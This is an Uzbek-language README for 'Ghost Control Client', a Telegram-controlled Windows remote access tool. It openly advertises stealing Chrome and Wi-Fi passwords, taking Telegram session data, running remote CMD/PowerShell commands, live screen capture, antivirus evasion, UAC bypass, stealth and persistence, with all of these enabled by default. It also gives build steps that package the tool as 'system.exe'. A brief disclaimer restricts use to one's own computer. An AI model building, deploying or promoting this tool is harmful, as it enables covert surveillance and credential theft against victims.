# 👻 Ghost Control Client v3.0.2

Telegram orqali kompyuterni masofadan boshqarish dasturi.

![Python](https://img.shields.io/badge/Python-3.7+-blue.svg)
![Windows](https://img.shields.io/badge/Platform-Windows-green.svg)
![Version](https://img.shields.io/badge/Version-3.0.2-orange.svg)

---

## 📋 Imkoniyatlar

### 🖥️ Tizim Boshqaruvi
- 📸 Ekran rasmi olish
- 🎥 Jonli efir (real-time ekran)
- 📂 Fayl menejeri
- 💻 CMD/PowerShell buyruqlar
- 🔊 Ovoz boshqaruvi (mute/unmute)
- 🔒 Kompyuterni qulflash/o'chirish

### 🔐 Ma'lumotlar
- 🔑 Chrome parollarini olish
- 📶 Wi-Fi parollarini olish
- 📍 Joylashuvni aniqlash (IP orqali)
- 💬 Telegram sessiya (tdata)

### 🤖 AI Yordamchi
- OpenRouter (Gemini 2.0 Free)
- Xatoliklarni tushuntirish
- Aqlli buyruqlar

### 🛡️ Xavfsizlik
- Antivirus chetlab o'tish
- Yashirin rejim
- UAC bypass
- Avtomatik yangilanish

---

## 🚀 O'rnatish

### 1. Talablar
```
Python 3.7+
Windows 10/11
```

### 2. Kutubxonalarni o'rnatish
```bash
pip install -r requirements.txt
```

### 3. Sozlash
`.env` faylini yarating:
```env
API_ID=your_api_id
API_HASH=your_api_hash
BOT_TOKEN=your_bot_token
ADMIN_ID=your_telegram_id
```

### 4. Ishga tushirish
```bash
python main.py
```

---

## 📦 EXE Yaratish

```bash
# Virtual environment yaratish
python -m venv .venv
.venv\Scripts\activate

# Kutubxonalarni o'rnatish
pip install -r requirements.txt
pip install pyinstaller

# EXE yaratish
build_system.bat
```

Natija: `system\system.exe`

---

## 📁 Loyiha Tuzilishi

```
v3.0.2/
├── main.py              # Asosiy client fayli
├── config.py            # Sozlamalar
├── handlers.py          # Telegram handlerlar
├── utils.py             # Yordamchi funksiyalar
├── persistence.py       # Doimiy ishlash moduli
├── uac_bypass.py        # UAC bypass
├── antivirus_evasion.py # Antivirus himoya
├── build_system.bat     # EXE yaratish skripti
├── .env                 # API kalitlar (GITIGNORE!)
├── requirements.txt     # Kutubxonalar
│
└── server/              # Server fayllar
    ├── bot.py           # Server bot
    ├── database.py      # SQLite database
    ├── device_manager.py# Qurilmalar boshqaruvi
    ├── ai_helper.py     # AI moduli
    └── panels.py        # UI panellar
```

---

## 🎮 Foydalanish

### Telegram Bot Buyruqlari
| Buyruq | Tavsif |
|--------|--------|
| `/start` | Asosiy menyu |
| `/screen` | Ekran rasmi |
| `/live` | Jonli efir |
| `/cmd <buyruq>` | CMD buyruq |
| `/ps <buyruq>` | PowerShell |
| `/location` | Joylashuv |
| `/wifi` | Wi-Fi parollar |
| `/passwords` | Chrome parollar |

---

## ⚙️ Sozlamalar (config.py)

| Sozlama | Tavsif | Default |
|---------|--------|---------|
| `STEALTH_ENABLED` | Yashirin rejim | `True` |
| `PERSISTENCE_ENABLED` | Avtoyuklash | `True` |
| `ANTIVIRUS_EVASION` | AV chetlab o'tish | `True` |
| `AI_ENABLED` | AI yordamchi | `True` |
| `DEBUG_MODE` | Debug rejim | `False` |

---

## 🔒 Xavfsizlik Eslatmalari

> ⚠️ **MUHIM:** Bu dastur faqat o'z kompyuteringizni boshqarish uchun mo'ljallangan!

- API kalitlarni `.env` faylda saqlang
- `.env` faylni GitHub'ga yuklamang
- Boshqa odamlarning kompyuterlarida ruxsatsiz ishlatish **QONUNGA XILOF!**

---

## 📝 Versiya Tarixi

### v3.0.2 (2026-01-12)
- ✅ Persistence moduli qo'shildi
- ✅ Server/Client ajratildi
- ✅ Duplikat registry tuzatildi
- ✅ AV-safe kod

### v3.0.1
- AI yordamchi qo'shildi
- OpenRouter integratsiya

### v3.0.0
- To'liq qayta yozildi
- Async arxitektura

---

## 📄 Litsenziya

Faqat ta'lim maqsadlari uchun. Muallif hech qanday javobgarlik olmaydi.

---

## 👨‍💻 Muallif

**Muxammadaziz**

📧 Telegram: [@Dr4ax1l](https://t.me/Dr4x1l)
